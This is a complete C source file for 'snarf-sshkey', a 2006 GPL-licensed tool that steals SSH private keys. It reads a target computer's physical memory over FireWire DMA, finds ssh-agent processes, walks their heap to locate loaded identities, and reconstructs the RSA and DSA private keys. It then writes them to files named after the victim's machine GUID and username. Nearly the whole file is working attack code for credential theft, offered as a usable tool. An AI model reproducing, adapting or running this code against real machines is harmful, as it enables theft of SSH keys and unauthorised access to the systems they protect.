/*  $Id$
 * vim: fdm=marker
 *
 *  snarf-sshkey : snarf ssh private keys from ssh-agent via
 *                 physical memory access (e.g. firewire)
 *
 *  Copyright (C) 2006
 *  losTrace aka "David R. Piegdon"
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License version 2, as
 *  published by the Free Software Foundation.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

#define _LARGEFILE64_SOURCE

// needed for memmem:
#define _GNU_SOURCE

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <time.h>

#include <openssl/rsa.h>
#include <openssl/dsa.h>
#include <openssl/evp.h>
#include <openssl/bn.h>

#include <libraw1394/raw1394.h>
#include <libraw1394/csr.h>

#include <physical.h>
#include <linear.h>
#include <endian_swap.h>

#include "ssh-authfile.h"

char pagedir[4096];
addr_t stack_bottom = 0;

#define NODE_OFFSET     0xffc0

// the following two functions (get_process_name and resolve_env) are
// using the stack bottom of the given process. i have found that
// after a process starts and parses its ENV and ARGVs, all those are
// in the uppermost page of the userspace (adr < 0xc0000000). in this
// page, the uppermost (-1) argument is the process name (with about
// five (5) \0 at the end of the string, then environment variables
// follow, each separated by a \0. then the ARGVs and then \0\0.

// return the process name in a malloc'ed buffer or NULL, if none.
char* get_process_name(linear_handle h)
{{{
	addr_t pn;
	addr_t padr;
	char* page;
	page = malloc(4096);
	int valid_page = 0;

	char* ret = NULL;

	stack_bottom = 0;
	pn = 0xbffff;

	while(!valid_page && pn >= 0xbf000) {
		if(linear_to_physical(h, pn*4096, &padr)) {
			// page is not mapped
		} else {
			// found stack bottom
			valid_page = 1;
			stack_bottom = pn;

			if(linear_read_page(h, pn, page))
				printf("UNREADABLE PAGE\n");
			else {
				char* p = page + 4096 - 1;

				// in stack: seek process name
				while( (*p == 0) && (p >= page) )
					p--;
				while( (*p != 0) && (p >= page) )
					p--;
				p++;
				ret = malloc(strlen(p) + 1);
				strcpy(ret, p);
			}
		}
		pn--;
	}

	free(page);

	return ret;
}}}

// will try to resolve an environment variable of the given process
// by looking at the bottom of the stack
// returns NULL or env-vars contents in an malloced buffer
//
// uses stack_bottom from get_process_name()
char* resolve_env(linear_handle h, char* envvar)
{{{
	int i;
	char* stack;			// buffer with all relevant pages (MAX_ARG_PAGES)
	char* p;			// pointer to count downward in stack
	char* q;			// points to value of env-var
	char* ret = NULL;		// to return an pointer to the alloced string
	int env_ok;			// still environment vars?
	int found_eq;			// still an '=' in this var?

	// fail if we did not find a stack bottom
	if(!stack_bottom)
		return NULL;

	// on linux, the max environment and argument is limited by PAGESIZE * MAX_ARG_PAGES
	// MAX_ARG_PAGES is 32 (statically defined in include/linux/binfmts.h)
	// so we will read 32 pages of the stack (if there are that many)
#define MAX_ARG_PAGES 32
	stack = calloc(MAX_ARG_PAGES, 4096);
	// watch off by one
	for( i=1; i<=MAX_ARG_PAGES; i++) {
		linear_read_page(h, stack_bottom-MAX_ARG_PAGES+i, stack + (4096*(i-1) ));
		// don't care for errors.
	}

	// start at bottom of stack
	p = stack + (4096*MAX_ARG_PAGES) - 1;
	// skip \0 at the end
	while( (*p == 0) && (p >= stack) )
		p--;
	// skip process name
	while( (*p != 0) && (p >= stack) )
		p--;
	// abort if there is no stuff
	if(p == stack)
		return NULL;
	// now process each \0-separated entry and check
	// for an equal-sign '='
	env_ok = 1;
	while(env_ok) {
		// we have not found a '=' here, yet.
		found_eq = 0;
		// go to beginning of string
		p--; // (we are currently pointing at the \0 after the string)
		while( (*p != 0) && (p >= stack) ) {
			if(*p == '=') {
				found_eq = 1;
				*p = 0;
				q = p+1;
			}
			p--;
		}
		if(p == stack) {env_ok = 0; break;}
		if(!found_eq) {env_ok = 2; break;}
		
		// p   q
		// |   |
		// FOO=BAR
		//    |
		//    \0
		if(!strcmp(envvar, p+1)) {
			// we found the var
			ret = malloc(strlen(q) + 1);
			strcpy(ret, q);
			break;
		}
	}

	return ret;
}}}


// fix a remote bignum to a local bignum:
// copy all important internal data of struct bignum_st
//
// returns malloc'ed bignum
BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
{{{
	addr_t p;
	BIGNUM* b;
#ifdef __BIG_ENDIAN__
	int i;
#endif

	printf("\t\t\t\tfix bignum @0x%08x: ", (uint32_t)rb);
	p = (uint32_t)rb;
	p &= 0xffffffff;

	if(!p) {
		printf("possibly ok...\n");
		return NULL;
	}

	b = calloc(1, sizeof(BIGNUM));

	if(   linear_read(lin, p   , &(b->d), 4)
	   || linear_read(lin, p+4 , &(b->top), 4)
	   || linear_read(lin, p+8 , &(b->dmax), 4)
	   || linear_read(lin, p+12, &(b->neg), 4)
	   || linear_read(lin, p+16, &(b->flags), 4) ) {
		free(b);
		printf("failed to read BIGNUM @0x%08llx\n", p);
		return NULL;
	}
#ifdef __BIG_ENDIAN__
	b->d = (BN_ULONG*) endian_swap32((uint32_t)b->d);
	b->top = endian_swap32(b->top);
	b->dmax = endian_swap32(b->dmax);
	b->neg = endian_swap32(b->neg);
	b->flags = endian_swap32(b->flags);
#endif

	// load b->d
	p = ((uint32_t)b->d);
	p &= 0xffffffff;
	b->d = calloc(4, b->dmax);
	if(linear_read(lin, p, b->d, 4*b->dmax)) {
		free(b->d);
		free(b);
		printf("failed to read BIGNUM data block @0x%08llx\n", p);
		return NULL;
	}
#ifdef __BIG_ENDIAN__
	for(i=0; i<b->dmax; i++) {
		b->d[i] = endian_swap32(b->d[i]);
	}
#endif

	printf("recovered to 0x%08x\n", (uint32_t)b);
	return b;
}}}

// steal a RSA key:
//   copy all important internal data of struct rsa_st
//
// copies RSA key to malloc'ed buffer
int steal_rsa_key(linear_handle lin, Key* key)
{{{
	addr_t p;

	if(!key->rsa)
		return 0;

	p = (uint32_t)key->rsa;
	p &= 0xffffffff;

	key->rsa = calloc(1, sizeof(RSA));

	if(   linear_read(lin, p   , &(key->rsa->pad), 4)
	   || linear_read(lin, p+4 , &(key->rsa->version), 4)
	   //                   +8  : *meth : who cares
	   //                   +12 : *engine: who cares
	   || linear_read(lin, p+16 , &(key->rsa->n), 4)
	   || linear_read(lin, p+20 , &(key->rsa->e), 4)
	   || linear_read(lin, p+24 , &(key->rsa->d), 4)
	   || linear_read(lin, p+28 , &(key->rsa->p), 4)
	   || linear_read(lin, p+32 , &(key->rsa->q), 4)
	   || linear_read(lin, p+36 , &(key->rsa->dmp1), 4)
	   || linear_read(lin, p+40 , &(key->rsa->dmq1), 4)
	   || linear_read(lin, p+44 , &(key->rsa->iqmp), 4)
	   || linear_read(lin, p+56 , &(key->rsa->flags), 4)) {
		free(key->rsa);
		key->rsa = NULL;
		return 0;
	}
	// don't care for anything else.
	
#ifdef __BIG_ENDIAN__
	key->rsa->pad = endian_swap32(key->rsa->pad);
	key->rsa->version = endian_swap32(key->rsa->version);

	key->rsa->n = (BIGNUM*)endian_swap32((uint32_t) key->rsa->n);
	key->rsa->e = (BIGNUM*)endian_swap32((uint32_t) key->rsa->e);
	key->rsa->d = (BIGNUM*)endian_swap32((uint32_t) key->rsa->d);
	key->rsa->p = (BIGNUM*)endian_swap32((uint32_t) key->rsa->p);
	key->rsa->q = (BIGNUM*)endian_swap32((uint32_t) key->rsa->q);
	key->rsa->dmp1 = (BIGNUM*)endian_swap32((uint32_t) key->rsa->dmp1);
	key->rsa->dmq1 = (BIGNUM*)endian_swap32((uint32_t) key->rsa->dmq1);
	key->rsa->iqmp = (BIGNUM*)endian_swap32((uint32_t) key->rsa->iqmp);

	key->rsa->flags = endian_swap32(key->rsa->flags);
#endif

	printf("\t\t\tRSA: pad:%d version:%ld flags:%d data: %p %p %p %p %p  %p %p %p\n",
		key->rsa->pad, key->rsa->version, key->rsa->flags, key->rsa->n, key->rsa->e, key->rsa->d, key->rsa->p, key->rsa->q,   key->rsa->dmp1, key->rsa->dmq1, key->rsa->iqmp);

	key->rsa->n = fix_bignum(lin, key->rsa->n);
	key->rsa->e = fix_bignum(lin, key->rsa->e);
	key->rsa->d = fix_bignum(lin, key->rsa->d);
	key->rsa->p = fix_bignum(lin, key->rsa->p);
	key->rsa->q = fix_bignum(lin, key->rsa->q);
	
	key->rsa->dmp1 = fix_bignum(lin, key->rsa->dmp1);
	key->rsa->dmq1 = fix_bignum(lin, key->rsa->dmq1);
	key->rsa->iqmp = fix_bignum(lin, key->rsa->iqmp);

	// x,y,z are public
	// 	p is a random prime
	// 	q is a random prime
	// 	n = p*q   (public modulus; bit length of this is of interest)
	//	e (public exponent): e*n is relatively prime (don't share other factors than 1)
	//	  e is usually 3 or 65537 (Fermat's F4 number)
	//	d = f(e,p,q)
	//
	//	dmp1:	?
	//	dmq1:	?
	//	iqmp:	?
	// n,e are public key; d is private key

	// check if all bignums were recovered and do some sanitychecks
	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {{{ // sanity checks
		int len;
		int i;
		int ret;
		BN_CTX* ctx;

		ctx = BN_CTX_new();

		// is p a prime?
		len = BN_num_bits(key->rsa->p);
		for(i = 0; i < BN_prime_checks_for_size(len); i++) {
			ret = BN_is_prime_fasttest_ex(key->rsa->p, BN_prime_checks, ctx, 1, NULL);
			if(ret == 0) {
				printf("\t\t\t(WARN) p is not a prime!\n");
				break;
			}
			if(ret == -1) {
				printf("\t\t\t(ERR)  some strange error during test, if p is a prime\n");
				break;
			}
		}
		if(ret == 1)
			printf("\t\t\t(ok)   p (%d bits) seems to be a prime (after %d tests)\n", len, i);

		// is q a prime?
		len = BN_num_bits(key->rsa->q);
		for(i = 0; i < BN_prime_checks_for_size(len); i++) {
			ret = BN_is_prime_fasttest_ex(key->rsa->q, BN_prime_checks, ctx, 1, NULL);
			if(ret == 0) {
				printf("\t\t\t(WARN) q is not a prime!\n");
				break;
			}
			if(ret == -1) {
				printf("\t\t\t(ERR)  some strange error during test, if q is a prime\n");
				break;
			}
		}
		if(ret == 1)
			printf("\t\t\t(ok)   q (%d bits) seems to be a prime (after %d tests)\n", len, i);

		// n:
		printf("\t\t\t(info) n is %d bits long.\n",BN_num_bits(key->rsa->n));


		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");

		BN_CTX_free(ctx);

		return 1;
	}}}

	// failed to recover RSA bignums...

	BN_free(key->rsa->n);
	BN_free(key->rsa->e);
	BN_free(key->rsa->d);
	BN_free(key->rsa->p);
	BN_free(key->rsa->q);
	BN_free(key->rsa->dmp1);
	BN_free(key->rsa->dmq1);
	BN_free(key->rsa->iqmp);

	free(key->rsa);
	key->rsa = NULL;
	printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
	return 0;
}}}

// steal a DSA key:
//   copy all important internal data of struct dsa_st
//
// copies DSA key to malloc'ed buffer
int steal_dsa_key(linear_handle lin, Key* key)
{{{
	addr_t p;

	if(!key->dsa)
		return 0;

	p = (uint32_t)key->dsa;
	p &= 0xffffffff;

	key->dsa = calloc(1,sizeof(DSA));

	if(   linear_read(lin, p   , &(key->dsa->pad), 4)
	   || linear_read(lin, p+4 , &(key->dsa->version), 4)
	   || linear_read(lin, p+8 , &(key->dsa->write_params), 4)
	   || linear_read(lin, p+12, &(key->dsa->p), 4)
	   || linear_read(lin, p+16, &(key->dsa->q), 4)
	   || linear_read(lin, p+20, &(key->dsa->g), 4)
	   || linear_read(lin, p+24, &(key->dsa->pub_key), 4)
	   || linear_read(lin, p+28, &(key->dsa->priv_key), 4)
	   || linear_read(lin, p+32, &(key->dsa->flags), 4) ) {
		free(key->dsa);
		key->dsa = NULL;
		return 0;
	}
	key->dsa->references = 0;
	// don't care for the rest
	//  p+36  method_mont_p (?)
	//  p+40  references (?)
	//  p+44  ex_data (?)
	//  p+48  meth (?)
	//  p+52  engine (?)

#ifdef __BIG_ENDIAN__
	key->dsa->pad = endian_swap32(key->dsa->pad);
	key->dsa->version = endian_swap32(key->dsa->version);
	key->dsa->write_params = endian_swap32(key->dsa->write_params);
	key->dsa->p = (BIGNUM*)endian_swap32((uint32_t) key->dsa->p);
	key->dsa->q = (BIGNUM*)endian_swap32((uint32_t) key->dsa->q);
	key->dsa->g = (BIGNUM*)endian_swap32((uint32_t) key->dsa->g);
	key->dsa->pub_key = (BIGNUM*)endian_swap32((uint32_t) key->dsa->pub_key);
	key->dsa->priv_key = (BIGNUM*)endian_swap32((uint32_t) key->dsa->priv_key);
	key->dsa->flags = endian_swap32(key->dsa->flags);
#endif

	printf("\t\t\tDSA: pad %d, version %d, write_params %d, p@0x%08x, q@0x%08x, g@0x%08x, pub_key@0x%08x, priv_key@0x%08x\n",
		key->dsa->pad, (uint32_t)key->dsa->version, key->dsa->write_params, (uint32_t)key->dsa->p,
		(uint32_t)key->dsa->q, (uint32_t)key->dsa->g, (uint32_t)key->dsa->pub_key, (uint32_t)key->dsa->priv_key);

	key->dsa->p = fix_bignum(lin, key->dsa->p);
	key->dsa->q = fix_bignum(lin, key->dsa->q);
	key->dsa->g = fix_bignum(lin, key->dsa->g);
	key->dsa->pub_key = fix_bignum(lin, key->dsa->pub_key);
	key->dsa->priv_key = fix_bignum(lin, key->dsa->priv_key);

	// p,q and g are public DSA parameters; 
	// 	p = a prime number L bits long (DSA standard say L \in [512,1024]
	// 	q = a 160-bit prime factor of p-1
	//	g = h^(p-1)/q mod p , where h is any number less than p-1 such that g>1
	//	priv_key = a number less than q
	//	pub_key = g^priv_key mod p

	// check if all bignums were recovered and do some sanitychecks
	if(key->dsa->p && key->dsa->q && key->dsa->g && key->dsa->pub_key && key->dsa->priv_key) {{{ // sanity checks
		int len;
		int i;
		int ret;
		BN_CTX* ctx;
		BIGNUM *o,*n;

		ctx = BN_CTX_new();
		o = BN_new();
		n = BN_new();

		// p: size
		len = BN_num_bits(key->dsa->p);
		printf("\t\t\t(info) p is %d bits long.\n", len);
		if(len%64)
			printf("\t\t\t(WARN) p is not a multiple of 64 bits long! (len%%64 = %d)\n", len%64);
		else
			printf("\t\t\t(ok)   p is a multiple of 64 bits long (64*%d)\n", len/64);
		// p: test for prime:
		for(i = 0; i < BN_prime_checks_for_size(len); i++) {
			ret = BN_is_prime_fasttest_ex(key->dsa->p, BN_prime_checks, ctx, 1, NULL);
			if(ret == 0) {
				printf("\t\t\t(WARN) p is not a prime!\n");
				break;
			}
			if(ret == -1) {
				printf("\t\t\t(ERR)  some strange error during test, if p is a prime\n");
				break;
			}
		}
		if(ret == 1)
			printf("\t\t\t(ok)   p seems to be a prime (after %d tests)\n", i);

		// q: size
		len = BN_num_bits(key->dsa->q);
		if(len != 160)
			printf("\t\t\t(WARN) q is not 160 bits but %d bits long!\n", len);
		else
			printf("\t\t\t(ok)   q is 160 bits long.\n");

		// pub_key:
		BN_mod_exp(o, key->dsa->g, key->dsa->priv_key, key->dsa->p, ctx);
		BN_sub(n, o, key->dsa->pub_key);
		if(BN_is_zero(n))
			printf("\t\t\t(ok)   pubkey matches to parameters\n");
		else
			printf("\t\t\t(WARN) pubkey does not match to parameters\n");

		// this should suffice as a test
		// show length of priv_key as info
		printf("\t\t\t(info) priv_key is %d bits long\n", BN_num_bits(key->dsa->priv_key));

		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");

		BN_CTX_free(ctx);

		BN_free(n);
		BN_free(o);

		return 1;
	}}}

	// failed to recover DSA bignums...

	BN_free(key->dsa->p);
	BN_free(key->dsa->q);
	BN_free(key->dsa->g);
	BN_free(key->dsa->pub_key);
	BN_free(key->dsa->priv_key);

	free(key->dsa);
	key->dsa = NULL;
	printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
	return 0;
}}}

// create a unique filename, consisting of target's 1394-GUID, ssh-agent's username and key's comment
// and save the key to this file
void save_key(linear_handle lin, char* key_comment, Key* key)
{{{
	uint32_t high;
	uint32_t low;
	uint64_t guid;

	char* username;
	char* comment;
	char* p;

	char* comment_field;		// finally used for comment-field in dumped key
	char* filename;			// file to dump key to

	// get GUID of target
	raw1394_read(lin->phy->data.ieee1394.raw1394handle, lin->phy->data.ieee1394.raw1394target, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x0c, 4, &low);
	raw1394_read(lin->phy->data.ieee1394.raw1394handle, lin->phy->data.ieee1394.raw1394target, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x10, 4, &high);
#ifndef __BIG_ENDIAN__  
	guid = (((uint64_t)high) << 32) | low;
	guid = endian_swap64(guid);
#else
	guid = (((uint64_t)low) << 32) | high;
#endif

	// get username of this agent
	username = resolve_env(lin, "USER");

	// create a comment that does not contain slashes
	comment = malloc(strlen(key_comment) + 1);
	p = comment;
	while(*key_comment) {
		if(*key_comment == '/')
			*p = '%';
		else
			*p = *key_comment;
		key_comment++;
		p++;
	}
	*p = 0;
	
	comment_field = malloc(strlen(username)+16+6+1);
	sprintf(comment_field, "%s@host_%016llx", username, guid);
	filename = malloc(16 + strlen(username) + strlen(comment_field) + 6 + 1);
	sprintf(filename, "key %016llx %s %s", guid, username, comment);

	// dump the key
	printf("\t\t" "\x1b[1;32m" "dumping key \"%s\" to file \"%s\"" "\x1b[0m" "\n", comment_field, filename);
	key_save_private(key, filename, "", comment_field);

	free(comment_field);
	free(filename);
	free(comment);
	free(username);
  }}}

// attack an ssh-agent's address space:
// 	create a string ala '$HOME/.ssh/'
// 	search string in heap
// 	search string's address in heap (is part of struct identity)
//	if found:
//		print identity.death (time of death of this key)
//		steal identity.key:
//			steal identity.key.rsa and identity.key.dsa
//			if one of them ok: save key to file
void check_ssh_agent(linear_handle lin)
{{{
#	define AGENT_START	0x08000
#	define AGENT_MAXLEN	0x00800
#	define REMOTE_TO_LOCAL(r,lbase)	((char*) (lbase + ((uint32_t)r) - (AGENT_START << 12)) )
#	define LOCAL_TO_REMOTE(l,lbase)	((char*) (l - lbase + (AGENT_START << 12)) )

	printf("\x1b[5;41m" "hit:" "\x1b[0m" " ");
	char identity_path[1024];
	char* heap;	// actually this is a dump of the executable and heap
			// but we don't care for the executable.
	char* home;
	addr_t pn;

	char* comment;	// location of the comment field
	char* rcomment; // remote location of the comment field
	char* identity; // location of struct identity (actually pointing somewhere into it)
	addr_t ridentity;
	addr_t rkey;	// remote location of the key
	time_t t;	// local time
	time_t death;	// when the key dies
	Key key;	// the key we want
	int n;

	// get string we search for
	home = resolve_env(lin, "HOME");
	if(!home) {
		printf("\tfailed to lookup $HOME!> ");
		return;
	}

	snprintf(identity_path, 1024, "%s/.ssh/", home);
	free(home);
	printf("identity path would be \"%s\"> ", identity_path);
	// now lets seek for this string. it will be located somewhere
	// on the heap, right behind the executable.
	// the executable is mapped somewhere after 0x08000000, so
	// we will just start there. 0x08800000 should never be hit.
	// btw. we are searching this string because it will be the
	// comment-field of the identity-struct of the ssh-agent.
	// for more info, please see ssh-agent.c of openssh
	heap = calloc(AGENT_MAXLEN, 4096);
	for(pn = 0; pn < AGENT_MAXLEN; pn++) {
		linear_read_page(lin, AGENT_START + pn, heap + 4096 * pn);
	}

	// find all substrings in the heap (one for each loaded keypair that resides in $HOME/.ssh/)
	comment = heap;
	while((comment = memmem(comment + 1, AGENT_MAXLEN * 4096 - (comment+1 - heap), identity_path, strlen(identity_path)))) {
						// do not search the tailing \0 !
		rcomment = LOCAL_TO_REMOTE(comment, heap);
		printf("\nfound the string \"%s\" at remote 0x%08x\n", comment, (uint32_t)rcomment);
#ifdef __BIG_ENDIAN__
		rcomment = (char*) endian_swap32((uint32_t)rcomment);
#endif
		identity = memmem(heap, AGENT_MAXLEN * 4096, &rcomment, 4);
		if(!identity) {
			printf("\tdid not find matching identity struct\n");
			break;
		}
		//
		// identity-struct struct found
		//
		identity -= 4; // now it points to 'Key* key' inside the identity-struct
		ridentity = ((uint64_t)(uint32_t)LOCAL_TO_REMOTE(identity, heap)) & 0xffffffff;

		// print time of death of this key:
		t = time(NULL);
		if(linear_read(lin, ridentity+8, &death, 4))
			break;
#ifdef __BIG_ENDIAN__
		death = endian_swap32(death);
#endif
		if(death == 0)
			printf("\t\tkey lives infinite.\n");
		else
			if(death < t)
				printf("\t\tkey should be dead (timeout) for %d seconds.\n", (uint32_t)t - (uint32_t)death);
			else
				printf("\t\tkey will live for %u seconds\n", (uint32_t)death - (uint32_t)t);


		// locate the key struct
		// carefull: sizeof(rkey) is 8!
		if(linear_read(lin, ridentity, &n, 4))
			break;
		rkey = n;
#ifdef __BIG_ENDIAN__
		rkey = ((uint64_t)endian_swap32((uint32_t)rkey));
#endif
		rkey &= 0xffffffff;
		printf("\t\tkey is at remote 0x%08x.\n", (uint32_t)rkey);

		// load the key struct
		if( linear_read(lin, rkey,    &key.type, 4)  ||
		    linear_read(lin, rkey+4,  &key.flags, 4) ||
		    linear_read(lin, rkey+8,  &key.rsa, 4)   ||
		    linear_read(lin, rkey+12, &key.dsa, 4) )
			break;
#ifdef __BIG_ENDIAN__
		key.type = endian_swap32(key.type);
		key.flags = endian_swap32(key.flags);
		key.rsa = (RSA*)endian_swap32((uint32_t)key.rsa);
		key.dsa = (DSA*)endian_swap32((uint32_t)key.dsa);
#endif
		printf("\t\tKEY: type:%d flags:0x%x, RSA* 0x%08x, DSA* 0x%08x\n", key.type, key.flags, (uint32_t)key.rsa, (uint32_t)key.dsa);

	 	// check all keytypes and steal existing
		if(key.rsa) {
			printf("\t\t" "\x1b[1;33m" "trying to steal RSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.rsa);
			if(!steal_rsa_key(lin, &key)) {
				printf("\t\tfailed :(\n");
				key.rsa = 0;
			}
		}
		if(key.dsa) {
			printf("\t\t" "\x1b[1;33m" "trying to steal DSA key at remote 0x%08x" "\x1b[0m" "\n", (uint32_t)key.dsa);
			if(!steal_dsa_key(lin, &key)) {
				printf("\t\tfailed :(\n");
				key.dsa = 0;
			}
		}
		// save the key to a file
		if(key.rsa || key.dsa)
			save_key(lin, comment, &key);

		// TODO: free key...
	}
	free(heap);
}}}

// will scan the targets memory for pagedirs,
// for each found: use pagedir for linear mapping. 
//                 in linear address-space: resolve process name
//                 if it is an ssh-agent, try to steal keys
int main(int argc, char**argv)
{{{
	physical_handle phy;
	union physical_type_data phy_data;
	linear_handle lin;
	addr_t pn;
	char page[4096];
	float prob;

	// create and associate a physical source to /dev/mem
	phy = physical_new_handle();
	if(!phy) {
		printf("physical handle is null\n");
		return -2;
	}
	if(argc != 2) {
		printf("please give targets nodeid\n");
		return -1;
	}
	phy_data.ieee1394.raw1394handle = raw1394_new_handle();
        if(!phy_data.ieee1394.raw1394handle) {
                printf("failed to open raw1394\n");
                return -1;
        }
	if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0)) {
		printf("raw1394 failed to set port\n");
		return -4;
	}
	phy_data.ieee1394.raw1394target = atoi(argv[1]) + NODE_OFFSET;
	printf("using target %d\n", phy_data.ieee1394.raw1394target - NODE_OFFSET);
	printf("associating physical source with raw1394\n"); fflush(stdout);
	if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
		printf("physical_handle_associate() failed\n");
		return -3;
	}
	// associate linear
	printf("new lin handle..\n"); fflush(stdout);
	lin = linear_new_handle();
	printf("assoc lin handle..\n"); fflush(stdout);
	if(linear_handle_associate(lin, phy, arch_ia32)) {
		printf("failed to associate lin ia32!\n");
		return -5;
	}

	printf("keys:\t\t.    -   checked another 0x80 pages\n"
		    "\t\t_    -   matched simple expression but not NCD\n"
		    "\t\to    -   matched NCD but failed to load referenced pagetables\n"
		    "\t\tK    -   matched NCD, loaded but found no stack (kernel thread?)\n"
		    "\t\tU<n> -   matched NCD, loaded, found stack and process name ``n''\n"
		    "\n");
	// search all pages for pagedirs
	// then, for each found, print process name
	// we only need to check first phys. GB
	for( pn = 0; pn < 0x40000; pn++ ) {
		fflush(stdout);
		if((pn%0x80) == 0)
			putchar('.');
		if(linear_is_pagedir_fast(lin, pn)) {
			// load page
			physical_read_page(phy, pn, page);
			prob = linear_is_pagedir_probability(lin, page);
			if(prob > 0.01) {
				char* pname;

				// set the pagedir
				//printf("page 0x%05llx prob: %0.3f", pn, prob);
				if(linear_set_new_pagedirectory(lin, page)) {
					putchar('o');
					continue;
				}

				// get process name
				pname = get_process_name(lin);
				if(!pname) {
					printf("\x1b[1;31m" "K" "\x1b[0m");
					continue;
				}
				printf("U" "\x1b[1;34m" "<%s>" "\x1b[0m", pname);

				// check for ssh-agent
				if((!strcmp(pname, "ssh-agent") || !strcmp(pname, "/usr/bin/ssh-agent")))
					check_ssh_agent(lin);

				free(pname);
			} else {
				putchar('_');
			}
		}
	}
	printf("\n\n");

	// release handles
	printf("rel lin handle..\n"); fflush(stdout);
	linear_handle_release(lin);
	printf("rel phy handle..\n"); fflush(stdout);
	physical_handle_release(phy);
	
	// exit 
	raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
	return 0;
}}}

